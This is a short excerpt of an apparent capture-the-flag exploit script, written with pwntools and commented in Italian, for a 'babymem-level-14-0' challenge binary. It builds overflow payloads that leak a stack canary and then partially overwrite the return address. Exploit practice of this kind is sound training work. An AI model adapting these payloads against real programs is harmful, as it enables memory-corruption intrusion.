...
context.binary = elf = ELF("/challenge/babymem-level-14-0")
p = elf.process()

# === PAYLOAD 1: Overflow + scrivi i due byte sul return address + "REPEAT" ===
payload1 = b"REPEAT" + b"A" * 128  # Riempie fino al punto dove inizia il canary
...
payload2 = b'A' * 408 + cana + b"CIAOCIAO" + b"\x07\x18"
